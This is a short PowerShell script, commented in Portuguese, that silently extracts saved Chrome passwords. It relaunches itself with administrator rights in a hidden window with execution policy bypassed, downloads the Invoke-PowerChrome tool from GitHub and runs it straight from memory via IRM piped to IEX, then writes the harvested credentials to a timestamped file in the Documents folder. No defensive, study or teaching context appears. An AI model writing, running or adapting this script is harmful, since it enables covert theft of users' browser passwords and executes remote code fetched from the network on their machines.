# ExtrairSenhas.ps1 - Versão SILENCIOSA que funciona (sem Start-Transcript)

# Força a execução como administrador (necessário para Chrome v20)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Define a pasta Documents
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
if (-not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
}

# Nome do arquivo com data/hora
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Carrega o script do GitHub
$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

# Executa e redireciona a saída para o arquivo (sem transcript)
Invoke-PowerChrome -Browser Chrome *> $arquivoSaida

# Sai silenciosamente
exit
